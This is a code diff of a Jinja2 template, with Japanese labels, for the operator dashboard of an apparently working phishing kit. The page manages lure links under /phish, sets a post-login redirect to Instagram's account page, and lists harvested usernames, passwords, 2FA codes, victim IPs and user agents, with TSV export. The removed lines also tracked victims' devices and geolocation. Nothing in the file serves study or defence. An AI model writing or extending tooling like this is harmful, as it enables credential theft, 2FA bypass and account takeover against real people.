@@ -1,76 +1,51 @@
 {% extends "base.html" %}
-{% block title %}{{ link.name }} — 抜き取り{% endblock %}
-{% block head %}
-<style>
-.wrap{max-width:900px;margin:0 auto}
-h1{font-size:18px;margin:0 0 6px}
-.bot{color:#8b93a7;font-size:11px}
-table{width:100%;border-collapse:collapse;font-size:12px}
-th,td{border-bottom:1px solid #1d212c;padding:6px 4px;text-align:left;vertical-align:top}
-th{color:#8b93a7;font-weight:500}
-code{background:#232734;padding:1px 5px;border-radius:4px;font-size:11px}
-.cred{color:#7ee08a;font-weight:700}
-.gps{color:#7ee08a}.ip{color:#f0b429}
-.btn{display:inline-block;padding:8px 14px;border-radius:8px;background:#2b3346;
-  color:#e6e9ef;text-decoration:none;font-size:12px;border:0;cursor:pointer}
-.flex{display:flex;gap:8px;flex-wrap:wrap}
-</style>
-{% endblock %}
 {% block content %}
-<div class="wrap">
-<h1>{{ link.name }}</h1>
-<div class="bot" style="margin-bottom:10px">
-  {{ '有効' if link.active else '停止中' }} / hit {{ link.hit_count }}<br>
-  飛び先 <code>{{ link.dest }}</code><br>
-  共有URL <code>{{ url }}</code>
-</div>
-<div class="flex" style="margin-bottom:12px">
-  <a class="btn" href="{{ url }}" target="_blank">開く</a>
-  <a class="btn" href="{{ base }}/phish/{{ link.code }}/qr.png" target="_blank">QR</a>
-  <a class="btn" href="{{ base }}/phish">一覧へ戻る</a>
+<p><a href="/phish">← 一覧</a></p>
+<h1>{{ link.label or link.code }}</h1>
+
+<div class="card">
+  <div>共有URL: <a href="/p/{{ link.code }}" target="_blank" rel="noopener">{{ origin }}/p/{{ link.code }}</a></div>
+  <div>アクセス数: {{ link.hits }} / 捕捉数: {{ creds|length }}</div>
+  <div class="muted">ログイン後の飛び先: {{ link.next_dest or "未設定（公式の既定遷移）" }}</div>
 </div>
 
-<h3 style="font-size:13px;margin:18px 0 6px;color:#c7cddb">抜き取り（{{ creds|length }}件）</h3>
-<table>
-  <tr><th>時刻</th><th>ID</th><th>パスワード</th><th>結果</th><th>IP</th></tr>
+<form method="post" action="/phish/{{ link.code }}/update" class="card">
+  <label>ラベル<input name="label" value="{{ link.label or '' }}" maxlength="80"></label>
+  <label>ログイン後の飛び先（任意）
+    <input name="next_dest" value="{{ link.next_dest or '' }}" placeholder="https://www.instagram.com/accounts/edit/" maxlength="400">
+  </label>
+  <label>メモ<input name="note" value="{{ link.note or '' }}" maxlength="400"></label>
+  <button type="submit">保存</button>
+</form>
+
+<form method="post" action="/phish/{{ link.code }}/toggle" style="display:inline">
+  <button type="submit">{{ "停止する" if link.active else "有効化する" }}</button>
+</form>
+<form method="post" action="/phish/{{ link.code }}/delete" style="display:inline"
+      onsubmit="return confirm('削除しますか')">
+  <button type="submit">削除</button>
+</form>
+
+<h2>捕捉した認証情報</h2>
+{% if creds %}
+<table class="grid">
+  <thead><tr><th>日時</th><th>ID</th><th>パスワード</th><th>2FAコード</th><th>結果</th><th>IP</th><th>UA</th></tr></thead>
+  <tbody>
   {% for c in creds %}
-  <tr>
-    <td class="bot">{{ (c.ts or '')[:19] }}</td>
-    <td><span class="cred">{{ c.user_val or c.user_mask or '-' }}</span></td>
-    <td><code>{{ c.pass_val or c.pass_mask or '-' }}</code></td>
-    <td>{% if c.ok %}<span class="gps">成功</span>{% elif c.ok == 0 %}<span class="ip">不一致</span>{% else %}<span class="bot">不明</span>{% endif %}</td>
-    <td class="bot">{{ c.hit_id }}</td>
-  </tr>
-  {% else %}
-  <tr><td colspan="5" class="bot">まだありません</td></tr>
+    <tr>
+      <td>{{ c.ts|int }}</td>
+      <td><code>{{ c.user_val }}</code></td>
+      <td><code>{{ c.pass_val }}</code></td>
+      <td>{% if c.code_val %}<code>{{ c.code_val }}</code>{% endif %}</td>
+      <td>{{ "成功" if c.ok else ("2FA待ち" if c.twofa else "失敗") }}</td>
+      <td>{{ c.ip }}</td>
+      <td class="ell">{{ c.ua }}</td>
+    </tr>
   {% endfor %}
+  </tbody>
 </table>
-
-<h3 style="font-size:13px;margin:18px 0 6px;color:#c7cddb">踏み（{{ hits|length }}件）</h3>
-<table>
-  <tr><th>時刻</th><th>端末</th><th>場所</th><th>IP</th></tr>
-  {% for h in hits %}
-  <tr>
-    <td class="bot">{{ (h.ts or '')[:19] }}</td>
-    <td class="bot">{{ h.device }} / {{ h.os }} / {{ h.browser }}{% if h.inapp %}（{{ h.inapp }}）{% endif %}</td>
-    <td class="bot">{{ h.city }} {{ h.region }} {{ h.country }}</td>
-    <td class="bot">{{ h.ip }}</td>
-  </tr>
-  {% else %}
-  <tr><td colspan="4" class="bot">まだありません</td></tr>
-  {% endfor %}
-</table>
-
-<h3 style="font-size:13px;margin:18px 0 6px;color:#c7cddb">操作</h3>
-<div class="flex">
-  <form method="post" action="{{ base }}/phish/{{ link.code }}/toggle">
-    <button class="btn" type="submit">{{ '停止する' if link.active else '有効にする' }}</button></form>
-  <form method="post" action="{{ base }}/phish/{{ link.code }}/clear"
-        onsubmit="return confirm('抜き取りだけ消しますか？')">
-    <button class="btn" type="submit">抜き取りを消す</button></form>
-  <form method="post" action="{{ base }}/phish/{{ link.code }}/delete"
-        onsubmit="return confirm('リンクごと削除しますか？')">
-    <button class="btn" type="submit">削除</button></form>
-</div>
-</div>
+<p><a href="/phish/{{ link.code }}/raw">TSVでダウンロード</a></p>
+{% else %}
+<p class="muted">まだ捕捉はありません。</p>
+{% endif %}
 {% endblock %}
